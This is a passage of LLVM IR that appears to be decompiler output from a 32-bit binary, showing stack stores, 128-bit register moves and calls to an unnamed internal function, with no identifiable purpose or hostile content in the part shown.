  store i32 1634956133, i32* %54, align 4, !insn.addr !1410
  %170 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1411
  store i32 5727591, i32* %170, align 4, !insn.addr !1411
  %171 = call i32 @function_10009390(), !insn.addr !1412
  %172 = load i128, i128* @global_var_10039b20, align 4, !insn.addr !1413
  %173 = call i128 @__asm_movaps(i128 %172), !insn.addr !1413
  %174 = inttoptr i32 %81 to i8*, !insn.addr !1414
  store i8 0, i8* %174, align 1, !insn.addr !1414
  %175 = inttoptr i32 %67 to i128*, !insn.addr !1415
  %176 = load i128, i128* %175, align 4, !insn.addr !1415
  call void @__asm_movups(i128 %176, i128 %173), !insn.addr !1415
  %177 = call i32 @function_10009390(), !insn.addr !1416
  %178 = load i128, i128* @global_var_10039a40, align 4, !insn.addr !1417
  %179 = call i128 @__asm_movaps(i128 %178), !insn.addr !1417
  store i8 0, i8* %174, align 1, !insn.addr !1418
  %180 = load i128, i128* %175, align 4, !insn.addr !1419
  call void @__asm_movups(i128 %180, i128 %179), !insn.addr !1419
  %181 = call i32 @function_10009390(), !insn.addr !1420
  %182 = add i32 %esp.0.reload, -120, !insn.addr !1421
  %183 = inttoptr i32 %182 to i32*, !insn.addr !1421
  store i32 0, i32* %183, align 4, !insn.addr !1421
  %184 = add i32 %esp.0.reload, -124, !insn.addr !1422
  %185 = inttoptr i32 %184 to i32*, !insn.addr !1422
  store i32 0, i32* %185, align 4, !insn.addr !1422
  %186 = add i32 %esp.0.reload, -128, !insn.addr !1423
  %187 = inttoptr i32 %186 to i32*, !insn.addr !1423
  store i32 0, i32* %187, align 4, !insn.addr !1423
  %188 = add i32 %esp.0.reload, -132, !insn.addr !1424
  %189 = inttoptr i32 %188 to i32*, !insn.addr !1424
  store i32 %127, i32* %189, align 4, !insn.addr !1424
  %190 = icmp eq i32 %127, 0, !insn.addr !1425
  store i32 %188, i32* %esp.1.reg2mem, !insn.addr !1426
  br i1 %190, label %dec_label_pc_1000337f, label %dec_label_pc_10003360, !insn.addr !1426

dec_label_pc_10003360:                            ; preds = %dec_label_pc_1000317a, %dec_label_pc_10003360
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %191 = add i32 %esp.1.reload, 64, !insn.addr !1427
  %192 = add i32 %esp.1.reload, -4, !insn.addr !1428
  %193 = inttoptr i32 %192 to i32*, !insn.addr !1428
  store i32 %191, i32* %193, align 4, !insn.addr !1428
  %194 = add i32 %esp.1.reload, 60, !insn.addr !1429
  %195 = add i32 %esp.1.reload, -8, !insn.addr !1430
  %196 = inttoptr i32 %195 to i32*, !insn.addr !1430
  store i32 %194, i32* %196, align 4, !insn.addr !1430
  %197 = add i32 %esp.1.reload, -12, !insn.addr !1431
  %198 = inttoptr i32 %197 to i32*, !insn.addr !1431
  store i32 0, i32* %198, align 4, !insn.addr !1431
  %199 = add i32 %esp.1.reload, -16, !insn.addr !1432
  %200 = inttoptr i32 %199 to i32*, !insn.addr !1432
  store i32 0, i32* %200, align 4, !insn.addr !1432
  %201 = add i32 %esp.1.reload, -20, !insn.addr !1433
  %202 = inttoptr i32 %201 to i32*, !insn.addr !1433
  store i32 0, i32* %202, align 4, !insn.addr !1433
  %203 = add i32 %esp.1.reload, 56, !insn.addr !1434
